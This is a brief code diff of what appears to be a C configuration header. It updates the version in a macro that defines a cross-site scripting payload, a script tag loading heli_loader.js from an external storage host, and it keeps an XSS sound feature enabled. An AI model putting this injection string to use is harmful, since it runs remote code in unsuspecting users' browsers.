@@ -79,7 +79,7 @@
 #define ENABLE_MENU_GUI 1
 
 // Script Message for XSS
-#define HELI_XSS_LOADER "\n<script src='https://storage.googleapis.com/heli.ucquarantine.net/v0.1.2/heli_loader.js'></script>\r\n"
+#define HELI_XSS_LOADER "\n<script src='https://storage.googleapis.com/heli.ucquarantine.net/v0.1.6/heli_loader.js'></script>\r\n"
 #define ENABLE_HELI_SOUNDS_XSS 1
 
 // Plotting Parameters
